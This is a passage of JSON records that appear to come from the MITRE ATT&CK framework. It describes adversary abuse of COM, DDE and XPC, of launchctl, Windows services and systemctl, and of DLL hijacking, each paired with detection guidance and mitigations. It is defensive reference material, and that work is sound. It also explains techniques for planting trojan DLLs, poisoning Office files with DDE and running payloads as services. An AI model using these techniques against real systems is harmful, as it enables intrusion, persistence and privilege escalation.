Microsoft ASR Nov 2017)</a> <a href=\"https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Reviving DDE Jan 2018)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Registry keys specific to Microsoft Office feature control security can be set to disable automatic DDE/OLE execution. <a href=\"https://technet.microsoft.com/library/security/4053440\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DDE Advisory Nov 2017)</a> <a href=\"https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BleepingComputer DDE Disabled in Word Dec 2017)</a> <a href=\"https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Disable DDEAUTO Oct 2017)</a> Microsoft also created, and enabled by default, Registry keys to completely disable DDE execution in Word and Excel. <a href=\"https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ADV170021 Dec 2017)</a>"},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Ensure all COM alerts and Protected View are enabled. <a href=\"https://support.office.com/en-us/article/What-is-Protected-View-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Protected View)</a>"},{"id":"M1054","name":"Software Configuration","description":"Consider disabling embedded files in Office programs, such as OneNote, that do not work with Protected View. <a href=\"https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Reviving DDE Jan 2018)</a> <a href=\"https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Disable DDEAUTO Oct 2017)</a>"}],"subTechniques":[{"id":"T1559.001","name":"Component Object Model","description":"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. <a href=\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fireeye Hunting COM June 2019)</a> Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COM)</a> Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM). <a href=\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fireeye Hunting COM June 2019)</a>\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COM)</a> Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence. <a href=\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fireeye Hunting COM June 2019)</a> <a href=\"https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ProjectZero File Write EoP Apr 2018)</a>","detection":"Monitor for COM objects loading DLLs and other modules not typically associated with the application. <a href=\"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017)</a> Enumeration of COM objects, via Query Registry or PowerShell, may also proceed malicious use. <a href=\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fireeye Hunting COM June 2019)</a> <a href=\"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma MMC20 COM Jan 2017)</a>\n\nMonitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.","platforms":["Windows"],"dataSources":["Module: Module Load","Script: Script Execution","Process: Process Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Modify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\AppID\\\\{AppID_GUID}</code> associated with the process-wide security of individual COM applications. <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Process Wide Com Keys)</a>\n\nModify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Ole</code> associated with system-wide security defaults for all COM applications that do no set their own process-wide security. <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft System Wide Com Keys)</a> <a href=\"https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COM ACL)</a>"},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Ensure all COM alerts and Protected View are enabled. <a href=\"https://support.office.com/en-us/article/What-is-Protected-View-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Protected View)</a>"}]},{"id":"T1559.002","name":"Dynamic Data Exchange","description":"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. <a href=\"https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BleepingComputer DDE Disabled in Word Dec 2017)</a> <a href=\"https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ADV170021 Dec 2017)</a> <a href=\"https://technet.microsoft.com/library/security/4053440\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DDE Advisory Nov 2017)</a>\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. <a href=\"https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost PS DDE May 2016)</a> <a href=\"https://www.contextis.com/blog/comma-separated-vulnerabilities\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kettle CSV DDE Aug 2014)</a> <a href=\"https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Reviving DDE Jan 2018)</a> <a href=\"https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost MacroLess DDE Oct 2017)</a> Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program. <a href=\"https://owasp.org/www-community/attacks/CSV_Injection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP CSV Injection)</a> (Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM). <a href=\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fireeye Hunting COM June 2019)</a>","detection":"Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\n\nOLE, Office Open XML, CSV, and other files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution. <a href=\"https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NVisio Labs DDE Detection Oct 2017)</a> <a href=\"https://owasp.org/www-community/attacks/CSV_Injection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP CSV Injection)</a> (Citation: CSV Excel Macro Injection )","platforms":["Windows"],"dataSources":["Process: Process Creation","Module: Module Load","Script: Script Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent DDE attacks and spawning of child processes from Office programs. <a href=\"https://docs.microsoft.com/windows/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ASR Nov 2017)</a> <a href=\"https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Reviving DDE Jan 2018)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Registry keys specific to Microsoft Office feature control security can be set to disable automatic DDE/OLE execution. <a href=\"https://technet.microsoft.com/library/security/4053440\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DDE Advisory Nov 2017)</a> <a href=\"https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BleepingComputer DDE Disabled in Word Dec 2017)</a> <a href=\"https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Disable DDEAUTO Oct 2017)</a> Microsoft also created, and enabled by default, Registry keys to completely disable DDE execution in Word and Excel. <a href=\"https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ADV170021 Dec 2017)</a>"},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Ensure Protected View is enabled. <a href=\"https://support.office.com/en-us/article/What-is-Protected-View-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Protected View)</a>"},{"id":"M1054","name":"Software Configuration","description":"Consider disabling embedded files in Office programs, such as OneNote, that do not work with Protected View. <a href=\"https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Reviving DDE Jan 2018)</a> <a href=\"https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Disable DDEAUTO Oct 2017)</a>"}]},{"id":"T1559.003","name":"XPC Services","description":"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon. <a href=\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: creatingXPCservices)</a> <a href=\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/DesigningDaemons.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Designing Daemons Apple Dev)</a>\n\nAdversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler. <a href=\"https://www.trendmicro.com/en_us/research/21/f/CVE-2021-30724_CVMServer_Vulnerability_in_macOS_and_iOS.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CVMServer Vuln)</a> <a href=\"https://wojciechregula.blog/post/learn-xpc-exploitation-part-3-code-injections/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Learn XPC Exploitation)</a> This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct Exploitation for Privilege Escalation.","detection":"","platforms":["macOS"],"dataSources":["Process: Process Access"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Enable the Hardened Runtime capability when developing applications. Do not include the <code>com.apple.security.get-task-allow</code> entitlement with the value set to any variation of true."}]}]},{"id":"T1569","name":"System Services","description":"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.","detection":"Monitor for command line invocations of tools capable of modifying services that doesn’t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry.","platforms":["Windows","macOS","Linux"],"dataSources":["Windows Registry: Windows Registry Key Modification","Process: Process Creation","Service: Service Creation","File: File Modification","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Prevent users from installing their own launch agents or launch daemons."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level."},{"id":"M1026","name":"Privileged Account Management","description":"Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by PsExec from running. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}],"subTechniques":[{"id":"T1569.001","name":"Launchctl","description":"Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. <a href=\"https://ss64.com/osx/launchctl.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Launchctl Man)</a>\n\nAdversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute Launch Agents or Launch Daemons. <a href=\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sofacy Komplex Trojan)</a> <a href=\"https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 20 macOS Common Tools and Techniques)</a>","detection":"Every Launch Agent and Launch Daemon must have a corresponding plist file on disk which can be monitored. Monitor for recently modified or created plist files with a significant change to the executable path executed with the command-line <code>launchctl</code> command. Plist files are located in the root, system, and users <code>/Library/LaunchAgents</code> or <code>/Library/LaunchDaemons</code> folders. \n\nMonitor command-line execution of the <code>launchctl</code> command immediately followed by abnormal network connections. Launch Agents or Launch Daemons with executable paths pointing to <code>/tmp</code> and <code>/Shared</code> folders locations are potentially suspicious. \n\nWhen removing Launch Agents or Launch Daemons ensure the services are unloaded prior to deleting plist files.","platforms":["macOS"],"dataSources":["Process: Process Creation","Command: Command Execution","Service: Service Creation","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Prevent users from installing their own launch agents or launch daemons."}]},{"id":"T1569.002","name":"Service Execution","description":"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. <a href=\"https://docs.microsoft.com/windows/win32/services/service-control-manager\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Service Control Manager)</a> The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and Net.\n\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russinovich Sysinternals)</a> Tools such as PsExec and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.","detection":"Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool PsExec.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Network Traffic: Network Traffic Flow","Service: Service Creation","Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level."},{"id":"M1026","name":"Privileged Account Management","description":"Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by PsExec from running. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}]},{"id":"T1569.003","name":"Systemctl","description":"Adversaries may abuse systemctl to execute commands or programs. Systemctl is the primary interface for systemd, the Linux init system and service manager. Typically invoked from a shell, Systemctl can also be integrated into scripts or applications.   \n\nAdversaries may use systemctl to execute commands or programs as Systemd Services. Common subcommands include: <code>systemctl start</code>, <code>systemctl stop</code>, <code>systemctl enable</code>, <code>systemctl disable</code>, and <code>systemctl status</code>. <a href=\"https://www.redhat.com/en/blog/linux-systemctl-manage-services\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Hat Systemctl 2022)</a>","detection":"","platforms":["Linux"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit user access to <code>systemctl</code> to only users who have a legitimate need."}]}]},{"id":"T1574","name":"Hijack Execution Flow","description":"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.","detection":"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nMonitor for changes to environment variables, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Autoruns for Windows)</a> Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.","platforms":["Linux","macOS","Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Creation","Module: Module Load","Process: Process Creation","Service: Service Metadata","File: File Modification","Command: Command Execution"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"When possible, include hash values in manifest files to help prevent side-loading of malicious libraries. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye DLL Side-Loading)</a>"},{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able.\n\nEnsure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Install software in write-protected locations. Set directory access controls to prevent file writes to the search paths for applications, both in the folders where applications are run from and the standard library folders."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries may use new payloads to execute this technique. Identify and block potentially malicious software executed through hijacking by using application control solutions also capable of blocking libraries loaded by legitimate software."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of behaviors related to process injection/memory tampering based on common sequences of indicators (ex: execution of specific API functions)."},{"id":"M1044","name":"Restrict Library Loading","description":"Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+.\n\nEnable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. <code>%SYSTEMROOT%</code>)to be used before local directory DLLs (e.g. a user's home directory)\n\nThe Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration &gt; [Policies] &gt; Administrative Templates &gt; MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode</code> <a href=\"https://msrc-blog.microsoft.com/2010/08/23/more-information-about-the-dll-preloading-remote-attack-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft More information about DLL)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic Link Library Search Order)</a>"},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for hijacking weaknesses. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>\n\nUse the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.\n\nFind and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic-Link Library Security)</a> <a href=\"https://skanthak.homepage.t-online.de/sentinel.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Vulnerability and Exploit Detector)</a>"},{"id":"M1051","name":"Update Software","description":"Update software regularly to include patches that fix DLL side-loading vulnerabilities."},{"id":"M1052","name":"User Account Control","description":"Turn off UAC's privilege elevation for standard users <code>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]</code> to automatically deny elevation requests, add: <code>\"ConsentPromptBehaviorUser\"=dword:00000000</code>. Consider enabling installer detection for all users by adding: <code>\"EnableInstallerDetection\"=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>\"EnableInstallerDetection\"=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged. <a href=\"https://seclists.org/fulldisclosure/2015/Dec/34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Executable Installers are Vulnerable)</a>"}],"subTechniques":[{"id":"T1574.001","name":"DLL","description":"Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking. <a href=\"https://unit42.paloaltonetworks.com/dll-hijacking-techniques/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: unit 42)</a>\n\nSpecific ways DLLs are abused by adversaries include:\n\n### DLL Sideloading\nAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).\n\nSide-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.\n\nAdversaries may also side-load other packages, such as BPLs (Borland Package Library). <a href=\"https://www.kroll.com/en/insights/publications/cyber/idatloader-distribution\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: kroll bpl)</a>\n\nAdversaries may chain DLL sideloading multiple times to fragment functionality hindering analysis. Adversaries using multiple DLL files can split the loader functions across different DLLs, with a main DLL loading the separated export functions. <a href=\"https://www.virusbulletin.com/conference/vb2023/abstracts/unveiling-activities-tropic-trooper-2023-deep-analysis-xiangoop-loader-and-entryshell-payload/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Virus Bulletin)</a> Spreading loader functions across multiple DLLs makes analysis harder, since all files must be collected to fully understand the malware’s behavior.  Another method implements a “loader-for-a-loader”, where a malicious DLL’s sole role is to load a second DLL (or a chain of DLLs) that contain the real payload. <a href=\"https://news.sophos.com/en-us/2023/05/03/doubled-dll-sideloading-dragon-breath/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos)</a>\n\n### DLL Search Order Hijacking\nAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program. <a href=\"https://unit42.paloaltonetworks.com/dll-hijacking-techniques/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: unit 42)</a>\n\n### DLL Redirection\nAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location. <a href=\"https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft redirection)</a> <a href=\"https://learn.microsoft.com/en-us/windows/win32/sbscs/manifests?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - manifests/assembly)</a>\n\n### Phantom DLL Hijacking\nAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module. <a href=\"https://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hexacorn DLL Hijacking)</a> <a 